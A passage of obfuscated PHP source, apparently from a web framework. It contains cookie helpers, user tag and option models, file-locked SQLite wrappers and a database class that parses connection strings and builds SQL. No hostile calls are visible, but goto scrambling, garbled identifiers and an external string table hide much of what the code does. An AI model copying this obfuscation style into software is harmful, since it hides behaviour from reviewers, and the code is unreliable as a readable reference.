$F¹ãÛ«ê¿; if (!$f¥Õ®ôê†¾) { $f¥Õ®ôê†¾ = str_replace(HOST, $E’‚Ø²…¸[33], APP_HOST); $f¥Õ®ôê†¾ = _get($GLOBALS, $E’‚Ø²…¸[799], $f¥Õ®ôê†¾); } $D´ÁŞÏïê = $E’‚Ø²…¸[33]; goto DÁïÎİ¤ò; CÛ‘ŒŞÒÓ: } public static function setSafe($B¿¾Å»ôç¿, $fÚÌ¶‡‚ï, $e¥š´Ÿß—Ã = 0) { self::set($B¿¾Å»ôç¿, $fÚÌ¶‡‚ï, $e¥š´Ÿß—Ã, !0); } public static function get($FÖ—Ã‰òÂÕ) { return isset($_COOKIE[$FÖ—Ã‰òÂÕ]) ? $_COOKIE[$FÖ—Ã‰òÂÕ] : !1; } public static function remove($Eäº‹•ŞãŒ, $DßÃŠˆÃÛç = false) { unset($_COOKIE[$Eäº‹•ŞãŒ]); self::set($Eäº‹•ŞãŒ, $_SERVER[¦·][33], 1, $DßÃŠˆÃÛç); } } goto E¸âÚ¹ğ®¦; cÄõ±“Â—Î: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\x65\x72\x5f\157\160\x74\151\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($d¥Û‡øøï‹) { $cµ•±ÕŞÌ =& $_SERVER[¦·]; if (!defined($cµ•±ÕŞÌ[427])) { define($cµ•±ÕŞÌ[427], 0); } return "\x55\163\145\x72\x4f\x70\x74\x69\x6f\x6e\137{$d¥Û‡øøï‹}\x5f" . USER_ID; } protected function filterWhere($d¥¸•œ¦Ñ‡) { $EéªçÀ×Á =& $_SERVER[¦·]; if (!defined($EéªçÀ×Á[427])) { define($EéªçÀ×Á[427], 0); } $d¥¸•œ¦Ñ‡[$EéªçÀ×Á[1441]] = USER_ID; return $d¥¸•œ¦Ñ‡; } public function cacheRemoveUser($FòÙ¾Š½Ø˜, $c²ßÉå‹Á¼) { return Cache::remove("\125\163\145\162\117\160\164\151\x6f\156\137{$FòÙ¾Š½Ø˜}\137" . $c²ßÉå‹Á¼); } protected function optionDefault($dã˜Ÿãº¢ = '') { $F·ëÉà¶Î =& $_SERVER[¦·]; if ($dã˜Ÿãº¢ == $F·ëÉà¶Î[33]) { return $GLOBALS[$F·ëÉà¶Î[6]][$F·ëÉà¶Î[2572]]; } if ($dã˜Ÿãº¢ == $F·ëÉà¶Î[2573]) { return $GLOBALS[$F·ëÉà¶Î[6]][$F·ëÉà¶Î[2574]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\x72\x2e\164\141\x67\x4c\x69\163\164"; public $modelType = "\125\163\x65\x72\117\x70\164\x69\x6f\x6e"; public $field = array("\x6e\x61\x6d\x65", "\x73\x74\171\x6c\x65", "\163\x6f\x72\x74"); public function listData($BóùÏÊ¹À¯ = false, $a¾ØÊ¼ãäô = "\x73\157\x72\x74", $d¢‡Œñ×Ş¤ = false) { return parent::listData($BóùÏÊ¹À¯, $a¾ØÊ¼ãäô, $d¢‡Œñ×Ş¤); } public function remove($FÁˆÚçš¹ª) { return parent::remove($FÁˆÚçš¹ª); } public function add($E¤‡‹Î—Ö¤, $eÖå¯ª²›Ã = "\154\x61\x62\145\x6c\55\x67\x72\145\171\x2d\x6e\157\162\155\141\x6c") { $FÔ„›Å„µ¯ =& $_SERVER[¦·]; if ($this->findByName($E¤‡‹Î—Ö¤)) { return !1; } $FÕ÷Û­â®« = array($FÔ„›Å„µ¯[386] => $E¤‡‹Î—Ö¤, $FÔ„›Å„µ¯[437] => $eÖå¯ª²›Ã, $FÔ„›Å„µ¯[2116] => $this->getSort($FÔ„›Å„µ¯[246]) + 1); return parent::insert($FÕ÷Û­â®«); } public function update($e—¯øª¹Œó, $E¬–àÚ£åĞ) { $eòìš¥±ŞÈ =& $_SERVER[¦·]; $BÄˆŞŠñğ = $this->listData($e—¯øª¹Œó); $cƒ¾Ïèñ÷ = $this->findByName($E¬–àÚ£åĞ[$eòìš¥±ŞÈ[28]]); if (!$BÄˆŞŠñğ || $cƒ¾Ïèñ÷ && $cƒ¾Ïèñ÷[$eòìš¥±ŞÈ[367]] != $BÄˆŞŠñğ[$eòìš¥±ŞÈ[367]]) { return !1; } return parent::update($e—¯øª¹Œó, $E¬–àÚ£åĞ); } public function moveTop($C“êõÆÙ·ô) { $bóÀ·å°•÷ =& $_SERVER[¦·]; $d’‹•ËéË£ = parent::listData(); $c—ÌîÍÙ• = $this->getSort($bóÀ·å°•÷[245]); foreach ($d’‹•ËéË£ as &$c–åÆ’‰) { if ($c–åÆ’‰[$bóÀ·å°•÷[367]] == $C“êõÆÙ·ô) { $c–åÆ’‰[$bóÀ·å°•÷[2134]] = $c—ÌîÍÙ•; continue; } $c–åÆ’‰[$bóÀ·å°•÷[2134]] += 1; } unset($c–åÆ’‰); return parent::resetData($d’‹•ËéË£); } public function moveBottom($d»áãÌÈÁ˜) { $F»†„Ïå† =& $_SERVER[¦·]; $Eƒ²ùˆÈÅÎ = $this->getSort($F»†„Ïå†[246]) + 1; return parent::update($d»áãÌÈÁ˜, array($F»†„Ïå†[2134] => $Eƒ²ùˆÈÅÎ)); } public function resetSort($c°›š°ÛÇ˜) { goto Aİ—ñ‰; eƒ…ÌÑé”Ë: for ($Eç»Øé„¤ = 0; $Eç»Øé„¤ < count($c°›š°ÛÇ˜); $Eç»Øé„¤++) { $c¶œò×[$c°›š°ÛÇ˜[$Eç»Øé„¤] . $d™Ï“Ü´Ú[33]] = $Eç»Øé„¤ + 1; } $d‹“ÓŒ« = parent::listData(); foreach ($d‹“ÓŒ« as &$b®ù¾ˆˆ¿Ç) { $d§¤–‡Èä = $c¶œò×[$b®ù¾ˆˆ¿Ç[$d™Ï“Ü´Ú[367]]]; $b®ù¾ˆˆ¿Ç[$d™Ï“Ü´Ú[2134]] = $d§¤–‡Èä ? $d§¤–‡Èä : $b®ù¾ˆˆ¿Ç[$d™Ï“Ü´Ú[2134]]; } goto AÆ¨çãôˆ²; AÆ¨çãôˆ²: unset($b®ù¾ˆˆ¿Ç); return parent::resetData($d‹“ÓŒ«); goto A÷Õó§àÃù; Aİ—ñ‰: $d™Ï“Ü´Ú =& $_SERVER[¦·]; $c¶œò× = array(); $c°›š°ÛÇ˜ = is_array($c°›š°ÛÇ˜) ? $c°›š°ÛÇ˜ : array(); goto eƒ…ÌÑé”Ë; A÷Õó§àÃù: } private function getSort($d‰µµ–ˆ›¬) { $b§ŠçÌÛÊ£ =& $_SERVER[¦·]; $e®¬†š¤è© = parent::listData(); $Eº­Àê®éò = array_to_keyvalue($e®¬†š¤è©, $b§ŠçÌÛÊ£[33], $b§ŠçÌÛÊ£[2134]); if (!$Eº­Àê®éò) { $Eº­Àê®éò = array(0); } $CÑèÅ‹³¨… = $d‰µµ–ˆ›¬ == $b§ŠçÌÛÊ£[246] ? max($Eº­Àê®éò) : min($Eº­Àê®éò); return intval($CÑèÅ‹³¨…); } } goto C´Ë›¢Å£; a´±„¸‡Ú: define($_SERVER[¦·][227], 2); define($_SERVER[¦·][228], 3); define($_SERVER[¦·][229], 1); goto Eõ»šà¾ñ„; dìˆßË´•š: class DbSqlite extends DbSqliteBase { public function query($d³¹ èî) { goto cÉîÈ¸Æ†à; BÚ‘ŒéŒŠŠ: if (!$bïíğãÓÆ) { return !1; } if (flock($bïíğãÓÆ, LOCK_EX)) { $D¶–ºÉŞíÁ = parent::query($d³¹ èî); flock($bïíğãÓÆ, LOCK_UN); fclose($bïíğãÓÆ); return $D¶–ºÉŞíÁ; } flock($bïíğãÓÆ, LOCK_UN); goto f§Ú•ºöİ÷; f§Ú•ºöİ÷: fclose($bïíğãÓÆ); show_json($Bè‰¬áîš[876], !1); return !1; goto Døœø–‹˜–; cÉîÈ¸Æ†à: $Bè‰¬áîš =& $_SERVER[¦·]; $båÔÇœÁ…ˆ = DATA_PATH . $Bè‰¬áîš[874]; $bïíğãÓÆ = fopen($båÔÇœÁ…ˆ, $Bè‰¬áîš[875]); goto BÚ‘ŒéŒŠŠ; Døœø–‹˜–: } public function execute($aç©ÛÆì‘Á) { goto Eù²‚ŸÂ¨§; d“­ñğ¦: if (!$a’„â´¾È¿) { return !1; } if (flock($a’„â´¾È¿, LOCK_EX)) { $AÍ…†¸ô» = parent::execute($aç©ÛÆì‘Á); flock($a’„â´¾È¿, LOCK_UN); fclose($a’„â´¾È¿); return $AÍ…†¸ô»; } flock($a’„â´¾È¿, LOCK_UN); goto e—îğ„Óß; e—îğ„Óß: fclose($a’„â´¾È¿); show_json($f«”¼½³»[876], !1); return !1; goto DŠŒ–´’·; Eù²‚ŸÂ¨§: $f«”¼½³» =& $_SERVER[¦·]; $bå ¸˜ŠÌ‡ = DATA_PATH . $f«”¼½³»[874]; $a’„â´¾È¿ = fopen($bå ¸˜ŠÌ‡, $f«”¼½³»[875]); goto d“­ñğ¦; DŠŒ–´’·: } } class DbSqlite3 extends DbSqlite3Base { public function query($dÄä‡àÖ—…) { goto D¿ó”¤™; F¹Š‰¯²”«: fclose($dí®¼ã²Ä˜); show_json($Aë–¯»±¤ë[876], !1); return !1; goto fĞ×Éóœè; bÛ´í¿¨‚Š: if (!$dí®¼ã²Ä˜) { return !1; } if (flock($dí®¼ã²Ä˜, LOCK_EX)) { $CªÆù«¿‚Á = parent::query($dÄä‡àÖ—…); flock($dí®¼ã²Ä˜, LOCK_UN); fclose($dí®¼ã²Ä˜); return $CªÆù«¿‚Á; } flock($dí®¼ã²Ä˜, LOCK_UN); goto F¹Š‰¯²”«; D¿ó”¤™: $Aë–¯»±¤ë =& $_SERVER[¦·]; $b¢·¬¼Ïò = DATA_PATH . $Aë–¯»±¤ë[874]; $dí®¼ã²Ä˜ = fopen($b¢·¬¼Ïò, $Aë–¯»±¤ë[875]); goto bÛ´í¿¨‚Š; fĞ×Éóœè: } public function execute($fìÊ‹’çòĞ) { goto AÄÍ®šÑ‹”; AÄÍ®šÑ‹”: $cÉî£áâŠ =& $_SERVER[¦·]; $FÎôÄí¡ƒ = DATA_PATH . $cÉî£áâŠ[874]; $Eï‚Œ•ñ‡— = fopen($FÎôÄí¡ƒ, $cÉî£áâŠ[875]); goto bê×í•Ë; b©÷ë–Î: fclose($Eï‚Œ•ñ‡—); show_json($cÉî£áâŠ[876], !1); return !1; goto a‚¯« Šöõ; bê×í•Ë: if (!$Eï‚Œ•ñ‡—) { return !1; } if (flock($Eï‚Œ•ñ‡—, LOCK_EX)) { $BØ­ÓŞÖ¸† = parent::execute($fìÊ‹’çòĞ); flock($Eï‚Œ•ñ‡—, LOCK_UN); fclose($Eï‚Œ•ñ‡—); return $BØ­ÓŞÖ¸†; } flock($Eï‚Œ•ñ‡—, LOCK_UN); goto b©÷ë–Î; a‚¯« Šöõ: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\x68\x69\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\161" => "\75", "\x6e\145\161" => "\x3c\x3e", "\147\164" => "\x3e", "\145\x67\x74" => "\x3e\75", "\x6c\164" => "\74", "\145\x6c\164" => "\74\x3d", "\x6e\x6f\164\x6c\x69\153\145" => "\116\117\124\x20\114\x49\x4b\x45", "\x6c\151\153\145" => "\114\111\x4b\105", "\151\x6e" => "\111\x4e", "\x6e\157\x74\151\x6e" => "\x4e\117\124\x20\111\116", "\156\157\164\40\x69\156" => "\116\117\124\x20\x49\116", "\x62\145\x74\167\x65\145\156" => "\102\105\124\x57\x45\105\116", "\156\157\164\142\x65\164\167\145\145\156" => "\116\117\124\40\x42\x45\x54\127\105\105\x4e", "\156\157\164\40\142\145\x74\x77\145\x65\x6e" => "\116\117\x54\x20\102\x45\x54\127\x45\x45\x4e"); protected $selectSql = "\x53\x45\114\x45\x43\124\45\x44\x49\x53\124\x49\116\103\124\x25\x20\45\x46\x49\105\x4c\x44\45\40\106\x52\117\x4d\40\x25\x54\x41\x42\x4c\x45\x25\x25\x4a\117\111\116\45\45\x57\x48\x45\122\x45\x25\45\x47\x52\117\x55\120\45\45\110\101\126\x49\116\107\45\x25\x4f\122\104\x45\122\x25\45\114\x49\115\x49\x54\x25\40\45\125\116\111\x4f\116\45\45\103\x4f\115\x4d\105\x4e\124\45"; protected $bind = array(); public static function getInstance() { $D¶Ğİ«Áß = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¦·][877], $D¶Ğİ«Áß); } public function factory($e£¶ï›öğº = '') { goto bæÇ³®¦ç¶; bæÇ³®¦ç¶: $cã‚‘õéƒ =& $_SERVER[¦·]; $e£¶ï›öğº = $this->parseConfig($e£¶ï›öğº); if (empty($e£¶ï›öğº[$cã‚‘õéƒ[878]])) { think_exception(think_lang($cã‚‘õéƒ[879])); } goto FÔŒ‰š­¼¬; dğôª¨†ğÙ: return $B‚˜Ñİ¥ è; goto c¯™ª»åÙà; FÔŒ‰š­¼¬: $this->dbType = ucwords(strtolower($e£¶ï›öğº[$cã‚‘õéƒ[878]])); $Fä¤’¶Ñ = $cã‚‘õéƒ[880] . $this->dbType; if (class_exists($Fä¤’¶Ñ)) { $B‚˜Ñİ¥ è = new $Fä¤’¶Ñ($e£¶ï›öğº); if ($cã‚‘õéƒ[724] != strtolower($e£¶ï›öğº[$cã‚‘õéƒ[878]])) { $B‚˜Ñİ¥ è->dbType = strtoupper($this->dbType); } else { $B‚˜Ñİ¥ è->dbType = $this->_getDsnType($e£¶ï›öğº[$cã‚‘õéƒ[830]]); } } else { think_exception(think_lang($cã‚‘õéƒ[881]) . $cã‚‘õéƒ[882] . $Fä¤’¶Ñ); } goto dğôª¨†ğÙ; c¯™ª»åÙà: } public function __call($cä¦„²³ñß, $dä…ŸĞ¼‹Ô) { if (method_exists($this, $cä¦„²³ñß)) { return call_user_func_array(array($this, $cä¦„²³ñß), $dä…ŸĞ¼‹Ô); } } protected function _getDsnType($c‚ÃŠ –êÇ) { $e¬›¥æ¤ª¿ = explode($_SERVER[¦·][4], $c‚ÃŠ –êÇ); $EÎ°ˆ×õÀš = strtoupper(trim($e¬›¥æ¤ª¿[0])); return $EÎ°ˆ×õÀš; } private function parseConfig($BäÈ‡ĞÊæß = '') { $a½—ÂÕŞÜ” =& $_SERVER[¦·]; if (!empty($BäÈ‡ĞÊæß) && is_string($BäÈ‡ĞÊæß)) { $BäÈ‡ĞÊæß = $this->parseDSN($BäÈ‡ĞÊæß); } elseif (is_array($BäÈ‡ĞÊæß)) { $BäÈ‡ĞÊæß = array_change_key_case($BäÈ‡ĞÊæß); $BäÈ‡ĞÊæß = array($a½—ÂÕŞÜ”[878] => $BäÈ‡ĞÊæß[$a½—ÂÕŞÜ”[723]], $a½—ÂÕŞÜ”[803] => $BäÈ‡ĞÊæß[$a½—ÂÕŞÜ”[883]], $a½—ÂÕŞÜ”[804] => $BäÈ‡ĞÊæß[$a½—ÂÕŞÜ”[884]], $a½—ÂÕŞÜ”[801] => $BäÈ‡ĞÊæß[$a½—ÂÕŞÜ”[885]], $a½—ÂÕŞÜ”[802] => $BäÈ‡ĞÊæß[$a½—ÂÕŞÜ”[886]], $a½—ÂÕŞÜ”[17] => $BäÈ‡ĞÊæß[$a½—ÂÕŞÜ”[887]], $a½—ÂÕŞÜ”[830] => $BäÈ‡ĞÊæß[$a½—ÂÕŞÜ”[725]], $a½—ÂÕŞÜ”[13] => isset($BäÈ‡ĞÊæß[$a½—ÂÕŞÜ”[888]]) ? $BäÈ‡ĞÊæß[$a½—ÂÕŞÜ”[888]] : array()); } elseif (empty($BäÈ‡ĞÊæß)) { if (think_config($a½—ÂÕŞÜ”[889]) && $a½—ÂÕŞÜ”[724] != strtolower(think_config($a½—ÂÕŞÜ”[890]))) { $BäÈ‡ĞÊæß = $this->parseDSN(think_config($a½—ÂÕŞÜ”[889])); } else { $BäÈ‡ĞÊæß = array($a½—ÂÕŞÜ”[878] => think_config($a½—ÂÕŞÜ”[890]), $a½—ÂÕŞÜ”[803] => think_config($a½—ÂÕŞÜ”[891]), $a½—ÂÕŞÜ”[804] => think_config($a½—ÂÕŞÜ”[892]), $a½—ÂÕŞÜ”[801] => think_config($a½—ÂÕŞÜ”[893]), $a½—ÂÕŞÜ”[802] => think_config($a½—ÂÕŞÜ”[894]), $a½—ÂÕŞÜ”[17] => think_config($a½—ÂÕŞÜ”[234]), $a½—ÂÕŞÜ”[830] => think_config($a½—ÂÕŞÜ”[889]), $a½—ÂÕŞÜ”[13] => think_config($a½—ÂÕŞÜ”[895])); } } return $BäÈ‡ĞÊæß; } protected function initConnect($A°ÓÏÖÊñ¹ = true) { if (1 == think_config($_SERVER[¦·][18])) { $this->_linkID = $this->multiConnect($A°ÓÏÖÊñ¹); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($fÆ˜•ê„Õ› = false) { $FÚ±´ªÚ¾ª =& $_SERVER[¦·]; static $Då“Ï´ñ–» = array(); if (empty($Då“Ï´ñ–»)) { foreach ($this->config as $dËÉâ†×Ø¾ => $DŠŞœè‹) { $Då“Ï´ñ–»[$dËÉâ†×Ø¾] = explode($FÚ±´ªÚ¾ª[47], $DŠŞœè‹); } } if (think_config($FÚ±´ªÚ¾ª[896])) { if ($fÆ˜•ê„Õ›) { $A¥˜õçõ–Ï = floor(mt_rand(0, think_config($FÚ±´ªÚ¾ª[897]) - 1)); } else { if (is_numeric(think_config($FÚ±´ªÚ¾ª[898]))) { $A¥˜õçõ–Ï = think_config($FÚ±´ªÚ¾ª[898]); } else { $A¥˜õçõ–Ï = floor(mt_rand(think_config($FÚ±´ªÚ¾ª[897]), count($Då“Ï´ñ–»[$FÚ±´ªÚ¾ª[801]]) - 1)); } } } else { $A¥˜õçõ–Ï = floor(mt_rand(0, count($Då“Ï´ñ–»[$FÚ±´ªÚ¾ª[801]]) - 1)); } $cÒºÓ·®Ñ‰ = array($FÚ±´ªÚ¾ª[803] => isset($Då“Ï´ñ–»[$FÚ±´ªÚ¾ª[803]][$A¥˜õçõ–Ï]) ? $Då“Ï´ñ–»[$FÚ±´ªÚ¾ª[803]][$A¥˜õçõ–Ï] : $Då“Ï´ñ–»[$FÚ±´ªÚ¾ª[803]][0], $FÚ±´ªÚ¾ª[804] => isset($Då“Ï´ñ–»[$FÚ±´ªÚ¾ª[804]][$A¥˜õçõ–Ï]) ? $Då“Ï´ñ–»[$FÚ±´ªÚ¾ª[804]][$A¥˜õçõ–Ï] : $Då“Ï´ñ–»[$FÚ±´ªÚ¾ª[804]][0], $FÚ±´ªÚ¾ª[801] => isset($Då“Ï´ñ–»[$FÚ±´ªÚ¾ª[801]][$A¥˜õçõ–Ï]) ? $Då“Ï´ñ–»[$FÚ±´ªÚ¾ª[801]][$A¥˜õçõ–Ï] : $Då“Ï´ñ–»[$FÚ±´ªÚ¾ª[801]][0], $FÚ±´ªÚ¾ª[802] => isset($Då“Ï´ñ–»[$FÚ±´ªÚ¾ª[802]][$A¥˜õçõ–Ï]) ? $Då“Ï´ñ–»[$FÚ±´ªÚ¾ª[802]][$A¥˜õçõ–Ï] : $Då“Ï´ñ–»[$FÚ±´ªÚ¾ª[802]][0], $FÚ±´ªÚ¾ª[17] => isset($Då“Ï´ñ–»[$FÚ±´ªÚ¾ª[17]][$A¥˜õçõ–Ï]) ? $Då“Ï´ñ–»[$FÚ±´ªÚ¾ª[17]][$A¥˜õçõ–Ï] : $Då“Ï´ñ–»[$FÚ±´ªÚ¾ª[17]][0], $FÚ±´ªÚ¾ª[830] => isset($Då“Ï´ñ–»[$FÚ±´ªÚ¾ª[830]][$A¥˜õçõ–Ï]) ? $Då“Ï´ñ–»[$FÚ±´ªÚ¾ª[830]][$A¥˜õçõ–Ï] : $Då“Ï´ñ–»[$FÚ±´ªÚ¾ª[830]][0], $FÚ±´ªÚ¾ª[13] => isset($Då“Ï´ñ–»[$FÚ±´ªÚ¾ª[13]][$A¥˜õçõ–Ï]) ? $Då“Ï´ñ–»[$FÚ±´ªÚ¾ª[13]][$A¥˜õçõ–Ï] : $Då“Ï´ñ–»[$FÚ±´ªÚ¾ª[13]][0]); return $this->connect($cÒºÓ·®Ñ‰, $A¥˜õçõ–Ï); } public function parseDSN($dÕÎÉ”ñáê) { $a‹Şõäİ§Õ =& $_SERVER[¦·]; if (empty($dÕÎÉ”ñáê)) { return !1; } $cÍ°ÕõØ› = parse_url($dÕÎÉ”ñáê); if ($cÍ°ÕõØ›[$a‹Şõäİ§Õ[168]]) { $DÉªÓ«’Õ = array($a‹Şõäİ§Õ[878] => $cÍ°ÕõØ›[$a‹Şõäİ§Õ[168]], $a‹Şõäİ§Õ[803] => isset($cÍ°ÕõØ›[$a‹Şõäİ§Õ[536]]) ? $cÍ°ÕõØ›[$a‹Şõäİ§Õ[536]] : $a‹Şõäİ§Õ[33], $a‹Şõäİ§Õ[804] => isset($cÍ°ÕõØ›[$a‹Şõäİ§Õ[899]]) ? $cÍ°ÕõØ›[$a‹Şõäİ§Õ[899]] : $a‹Şõäİ§Õ[33], $a‹Şõäİ§Õ[801] => isset($cÍ°ÕõØ›[$a‹Şõäİ§Õ[169]]) ? $cÍ°ÕõØ›[$a‹Şõäİ§Õ[169]] : $a‹Şõäİ§Õ[33], $a‹Şõäİ§Õ[802] => isset($cÍ°ÕõØ›[$a‹Şõäİ§Õ[170]]) ? $cÍ°ÕõØ›[$a‹Şõäİ§Õ[170]] : $a‹Şõäİ§Õ[33], $a‹Şõäİ§Õ[17] => isset($cÍ°ÕõØ›[$a‹Şõäİ§Õ[75]]) ? substr($cÍ°ÕõØ›[$a‹Şõäİ§Õ[75]], 1) : $a‹Şõäİ§Õ[33]); } else { preg_match($a‹Şõäİ§Õ[900], trim($dÕÎÉ”ñáê), $A‰•ÓİîÔ›); $DÉªÓ«’Õ = array($a‹Şõäİ§Õ[878] => $A‰•ÓİîÔ›[1], $a‹Şõäİ§Õ[803] => $A‰•ÓİîÔ›[2], $a‹Şõäİ§Õ[804] => $A‰•ÓİîÔ›[3], $a‹Şõäİ§Õ[801] => $A‰•ÓİîÔ›[4], $a‹Şõäİ§Õ[802] => $A‰•ÓİîÔ›[5], $a‹Şõäİ§Õ[17] => $A‰•ÓİîÔ›[6]); } $DÉªÓ«’Õ[$a‹Şõäİ§Õ[830]] = $a‹Şõäİ§Õ[33]; return $DÉªÓ«’Õ; } protected function debug() { $Bİ‚…¸Ğ =& $_SERVER[¦·]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Bİ‚…¸Ğ[901]; if (think_config($Bİ‚…¸Ğ[902])) { think_status($Bİ‚…¸Ğ[903]); think_trace($this->queryStr . $Bİ‚…¸Ğ[904] . think_status($Bİ‚…¸Ğ[20], $Bİ‚…¸Ğ[903], 6) . $Bİ‚…¸Ğ[905], $Bİ‚…¸Ğ[33], $Bİ‚…¸Ğ[906]); } } protected function parseLock($Aåò®Ëªè¶ = false) { $cÎŸÍÓîÏÒ =& $_SERVER[¦·]; if (!$Aåò®Ëªè¶) { return $cÎŸÍÓîÏÒ[33]; } if ($cÎŸÍÓîÏÒ[832] == $this->dbType) { return $cÎŸÍÓîÏÒ[907]; } return $cÎŸÍÓîÏÒ[908]; } protected function parseSet($b“¬òÓî¾“) { $E Ë…©“ÕÑ =& $_SERVER[¦·]; foreach ($b“¬òÓî¾“ as $FÅ®´õâ´ => $b‹±©İ§•÷) { if (is_array($b‹±©İ§•÷) && $E Ë…©“ÕÑ[285] == $b‹±©İ§•÷[0]) { $D‘¬ºÏôÏ†[] = $this->parseKey($FÅ®´õâ´) . $E Ë…©“ÕÑ[909] . $b‹±©İ§•÷[1]; } elseif (is_scalar($b‹±©İ§•÷) || is_null($b‹±©İ§•÷)) { $D‘¬ºÏôÏ†[] = $this->parseKey($FÅ®´õâ´) . $E Ë…©“ÕÑ[909] . $this->parseValue($b‹±©İ§•÷); } } return $E Ë…©“ÕÑ[910] . implode($E Ë…©“ÕÑ[47], $D‘¬ºÏôÏ†); } protected function bindParam($c‰É‚½Óâ, $eŠˆ·‘ŒŠ«) { $this->bind[$_SERVER[¦·][4] . $c‰É‚½Óâ] = $eŠˆ·‘ŒŠ«; } protected function parseBind($C …î×–Ê©) { $C …î×–Ê© = array_merge($this->bind, $C …î×–Ê©); $this->bind = array(); return $C …î×–Ê©; } function parseKey(&$a©Ğå›ÚÅÍ, $C¾Ã°£ğ = true) { if ($C¾Ã°£ğ) { $a©Ğå›ÚÅÍ = $this->parseKeyCheck($a©Ğå›ÚÅÍ); } return $a©Ğå›ÚÅÍ; } function parseKeyCheck($Dƒ¥åƒÈ‰) { $B©¼Â¸óÀ† =& $_SERVER[¦·]; $Dƒ¥åƒÈ‰ = trim($Dƒ¥åƒÈ‰); if (!preg_match($B©¼Â¸óÀ†[911], $Dƒ¥åƒÈ‰)) { think_exception($B©¼Â¸óÀ†[912] . $Dƒ¥åƒÈ‰); } return $Dƒ¥åƒÈ‰; } protected function parseValue($b”Óò±“Ë) { $EİËéÉéâö =& $_SERVER[¦·]; if (is_string($b”Óò±“Ë)) { $b”Óò±“Ë = $EİËéÉéâö[871] . $this->escapeString($b”Óò±“Ë) . $EİËéÉéâö[871]; } elseif (isset($b”Óò±“Ë[0]) && is_string($b”Óò±“Ë[0]) && strtolower($b”Óò±“Ë[0]) == $EİËéÉéâö[285]) { $b”Óò±“Ë = $this->escapeString($b”Óò±“Ë[1]); } elseif (is_array($b”Óò±“Ë)) { $b”Óò±“Ë = array_map(array($this, $EİËéÉéâö[872]), $b”Óò±“Ë); } elseif (is_bool($b”Óò±“Ë)) { $b”Óò±“Ë = $b”Óò±“Ë ? $EİËéÉéâö[83] : $EİËéÉéâö[470]; } elseif (is_null($b”Óò±“Ë)) { $b”Óò±“Ë = $EİËéÉéâö[99]; } return $b”Óò±“Ë; } protected function parseField($F•Óßùİ×) { $b´¨ß›ïŠ† =& $_SERVER[¦·]; if (is_string($F•Óßùİ×) && strpos($F•Óßùİ×, $b´¨ß›ïŠ†[47])) { $F•Óßùİ× = explode($b´¨ß›ïŠ†[47], $F•Óßùİ×); } if (is_array($F•Óßùİ×)) { $Aïñ‹ÚèÏ = array(); foreach ($F•Óßùİ× as $D¨Òñ‰½Âó => $F›©‚¦Ó¶) { if (!is_numeric($D¨Òñ‰½Âó)) { $Aïñ‹ÚèÏ[] = $this->parseKey($D¨Òñ‰½Âó) . $b´¨ß›ïŠ†[913] . $this->parseKey($F›©‚¦Ó¶); } else { $Aïñ‹ÚèÏ[] = $this->parseKey($F›©‚¦Ó¶); } } $c†Ã¥ê‚¬¤ = implode($b´¨ß›ïŠ†[47], $Aïñ‹ÚèÏ); } elseif (is_string($F•Óßùİ×) && !empty($F•Óßùİ×)) { $c†Ã¥ê‚¬¤ = $F•Óßùİ×; } else { $c†Ã¥ê‚¬¤ = $b´¨ß›ïŠ†[176]; } return $c†Ã¥ê‚¬¤; } protected function parseTable($dÉ—æí¿øÜ) { $c‰À¼ËÂÙ =& $_SERVER[¦·]; if (is_array($dÉ—æí¿øÜ)) { $F¾ª©Ô°Èõ = array(); foreach ($dÉ—æí¿øÜ as $bò–ãŸ£ => $B¨¾Ë‡¥­„) { if (!is_numeric($bò–ãŸ£)) { $F¾ª©Ô°Èõ[] = $this->parseKey($bò–ãŸ£) . $c‰À¼ËÂÙ[50] . $this->parseKey($B¨¾Ë‡¥­„); } else { $F¾ª©Ô°Èõ[] = $this->parseKey($bò–ãŸ£); } } $dÉ—æí¿øÜ = $F¾ª©Ô°Èõ; } elseif (is_string($dÉ—æí¿øÜ)) { if (strstr($dÉ—æí¿øÜ, $c‰À¼ËÂÙ[50])) { return $dÉ—æí¿øÜ; } $dÉ—æí¿øÜ = explode($c‰À¼ËÂÙ[47], $dÉ—æí¿øÜ); array_walk($dÉ—æí¿øÜ, array($this, $c‰À¼ËÂÙ[820])); } return $c‰À¼ËÂÙ[914] . trim(implode($c‰À¼ËÂÙ[915], $dÉ—æí¿øÜ), $c‰À¼ËÂÙ[826]) . $c‰À¼ËÂÙ[914]; } protected function parseWhere($CåÂµ‡®«) { $e½°¡é®èî =& $_SERVER[¦·]; $e´ßßÌõù” = $e½°¡é®èî[33]; if (is_string($CåÂµ‡®«)) { $e´ßßÌõù” = $CåÂµ‡®«; } else { $C«µ»¨Ş Ê = isset($CåÂµ‡®«[$e½°¡é®èî[916]]) ? strtoupper($CåÂµ‡®«[$e½°¡é®èî[916]]) : $e½°¡é®èî[33]; if (in_array($C«µ»¨Ş Ê, array($e½°¡é®èî[917], $e½°¡é®èî[918], $e½°¡é®èî[919]))) { $C«µ»¨Ş Ê = $e½°¡é®èî[50] . $C«µ»¨Ş Ê . $e½°¡é®èî[50]; unset($CåÂµ‡®«[$e½°¡é®èî[916]]); } else { $C«µ»¨Ş Ê = $e½°¡é®èî[920]; } foreach ($CåÂµ‡®« as $Fç³†ÍË•¹ => $e¿”¹…ƒ…‡) { $e´ßßÌõù” .= $e½°¡é®èî[265]; if (is_numeric($Fç³†ÍË•¹)) { $Fç³†ÍË•¹ = $e½°¡é®èî[921]; } if (0 === strpos($Fç³†ÍË•¹, $e½°¡é®èî[70])) { $e´ßßÌõù” .= $this->parseThinkWhere($Fç³†ÍË•¹, $e¿”¹…ƒ…‡); } else { if (!preg_match($e½°¡é®èî[922], trim($Fç³†ÍË•¹))) { think_exception(think_lang($e½°¡é®èî[923]) . $e½°¡é®èî[4] . $Fç³†ÍË•¹); } $F«±’¢²¬‡ = is_array($e¿”¹…ƒ…‡) && isset($e¿”¹…ƒ…‡[$e½°¡é®èî[924]]); 